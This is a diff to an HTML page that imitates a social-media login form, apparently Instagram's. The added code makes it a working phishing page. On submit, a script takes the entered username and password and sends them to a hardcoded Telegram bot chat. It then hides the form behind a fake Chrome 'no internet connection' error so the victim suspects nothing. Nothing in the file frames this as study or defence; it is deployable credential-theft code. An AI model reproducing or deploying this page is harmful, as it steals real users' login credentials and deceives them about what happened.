@@ -75,8 +75,6 @@
             border: 1px solid #efefef;
         }
 
-        /* label intial position*/
-
         label {
             position: absolute;
             pointer-events: none;
@@ -90,24 +88,19 @@
             padding-top: 6px;
         }
 
-        /* hiding placeholder in all browsers */
-
         input::placeholder {
             visibility: hidden;
         }
 
-        /* hiding  placeholder in mozilla */
         .login-form ::-moz-placeholder {
             color: transparent;
         }
 
-        /* label final position */
         input:not(:placeholder-shown)+label {
             transform: translateY(0);
             font-size: 11px;
         }
 
-        /* input padding increases if placeholder is not shown */
         input:not(:placeholder-shown) {
             padding-top: 14px;
             padding-bottom: 2px;
@@ -166,23 +159,77 @@
             font-size: 11px;
             color: #003569;
         }
+
+
+
+
+
+
+
+
+
+        .error-container {
+            max-width: 600px;
+            display: none;
+        }
+
+        .error-container .dino {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: url('https://ssl.gstatic.com/chrome/components/dino/dino-offline-sprite-1x.png') no-repeat;
+            background-size: contain;
+        }
+
+        .error-container h1 {
+            font-size: 1.5em;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .error-container p {
+            font-size: 1em;
+            margin: 10px 0;
+        }
+
+        .error-container ul {
+            list-style: none;
+            padding: 0;
+            text-align: left;
+            display: inline-block;
+            text-align: left;
+        }
+
+        .error-container ul li {
+            font-size: 0.9em;
+            margin: 5px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .error-container ul li::before {
+            content: "•";
+            color: #5f6368;
+            position: absolute;
+            left: 0;
+        }
     </style>
 </head>
 
 <body>
-    <div class="container">
+    <div class="container" id="container">
         <div class="box">
             <div class="heading"></div>
-            <form class="login-form">
+            <form class="login-form" id="loginForm">
                 <div class="field">
-                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <input id="username" type="text" placeholder="Phone number, username, or email" />
                     <label for="username">Phone number, username, or email</label>
                 </div>
                 <div class="field">
-                    <input id="password" type="password" placeholder="password" />
+                    <input id="password" type="password" placeholder="Password" />
                     <label for="password">Password</label>
                 </div>
-                <button class="login-button" title="login">Log In</button>
+                <button type="submit" class="login-button" id="login-button" onclick="hata()">Log In</button>
                 <div class="separator">
                     <div class="line"></div>
                     <p>OR</p>
@@ -191,7 +238,7 @@
                 <div class="other">
                     <button class="fb-login-btn" type="button">
                         <i class="fa fa-facebook-official fb-icon"></i>
-                        <span class="">Log in with Facebook</span>
+                        <span>Log in with Facebook</span>
                     </button>
                     <a class="forgot-password" href="#">Forgot password?</a>
                 </div>
@@ -201,6 +248,75 @@
             <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
         </div>
     </div>
+
+
+
+
+
+    <div class="error-container" id="error-container">
+        <div class="dino"></div>
+        <h1>İnternet bağlantısı yok</h1>
+        <p>Aşağıdakileri deneyin:</p>
+        <ul>
+            <li>Ağ kabloları, modem ve yönlendirici kontrol ediliyor</li>
+            <li>Kablosuz ağa yeniden bağlanma</li>
+            <li>Windows Ağ Teşhislerini Çalıştırma</li>
+        </ul>
+        <p>ERR_INTERNET_DISCONNECTED</p>
+    </div>
+
+
+
+    <script>
+
+
+        function hata(){
+            document.getElementById("container").style.display="none";
+            document.getElementById("error-container").style.display="block";
+        }
+
+
+
+
+
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Formun normal gönderilmesini engelle
+
+            // Formdan verileri al
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Telegram Bot API URL'si
+            var token = "7782206979:AAE_JMIsLiSJaKpgEFFYU4eWaYHCXZqciAg"; // Bot token
+            var chatId = "5312871954"; // Chat ID (Bu sizin chat_id'niz)
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // Mesaj içeriğini oluştur
+            var text = `işte bilgiler  :):\n\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
+
+            // Veriyi Telegram API'sine gönder
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("", data);
+                })
+                .catch(error => {
+                    console.error("Hata:", error);
+                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                });
+        });
+    </script>
+
 </body>
 
 </html>
